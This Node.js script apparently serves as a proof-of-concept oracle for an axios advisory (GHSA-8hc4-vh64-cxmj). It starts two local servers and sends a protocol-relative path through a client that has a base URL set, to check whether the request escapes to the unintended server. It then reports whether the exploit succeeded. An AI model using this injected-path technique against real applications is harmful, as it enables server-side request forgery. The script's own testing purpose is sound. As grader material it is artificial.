let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  let goodServer = null;
  let badServer = null;
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;
    const http = require('node:http');

    if (!axios || typeof axios.create !== 'function' || typeof axios.get !== 'function') {
      throw new Error('axios_api_unavailable');
    }

    const marker = 'ghsa-8hc4-vh64-cxmj';

    const listen = (server) => new Promise((resolve, reject) => {
      server.once('error', reject);
      server.listen(0, '127.0.0.1', () => {
        server.removeListener('error', reject);
        resolve(server.address().port);
      });
    });

    const closeServer = (server) => new Promise((resolve) => {
      if (!server) return resolve();
      server.close(() => resolve());
    });

    let goodHits = 0;
    let badHits = 0;

    goodServer = http.createServer((req, res) => {
      goodHits += 1;
      res.statusCode = 200;
      res.end('good');
    });

    badServer = http.createServer((req, res) => {
      badHits += 1;
      res.statusCode = 200;
      res.end('bad');
    });

    const goodPort = await listen(goodServer);
    const badPort = await listen(badServer);

    const client = axios.create({ baseURL: 'http://127.0.0.1:' + String(goodPort) });

    // Benign operation: must succeed first.
    const benignResp = await client.get('/ok-' + marker, { timeout: 2000 });
    if (!benignResp || benignResp.data !== 'good') {
      throw new Error('benign_request_unexpected_response');
    }

    operation_completed = true;

    // Malicious input per advisory pattern: leading slash user input becomes protocol-relative.
    const userInput = '/127.0.0.1:' + String(badPort);
    const maliciousPath = '/' + userInput; // => //127.0.0.1:<badPort>

    let maliciousError = null;
    let maliciousData = null;
    try {
      const r = await client.get(maliciousPath, { timeout: 2000, maxRedirects: 0 });
      maliciousData = r && r.data;
    } catch (e) {
      maliciousError = e;
    }

    // Vulnerable: request reaches bad server (badHits > 0 or data == 'bad').
    // Patched (server-side): malformed/blocked and bad server not reached.
    exploit_succeeded = badHits > 0 || maliciousData === 'bad';

    evidence = JSON.stringify({
      marker,
      goodPort,
      badPort,
      benignData: benignResp && benignResp.data,
      maliciousPath,
      maliciousData,
      maliciousError: maliciousError ? (maliciousError.code || maliciousError.name || 'error') : null,
      goodHits,
      badHits
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  } finally {
    try { await new Promise((r) => goodServer ? goodServer.close(() => r()) : r()); } catch (_) {}
    try { await new Promise((r) => badServer ? badServer.close(() => r()) : r()); } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
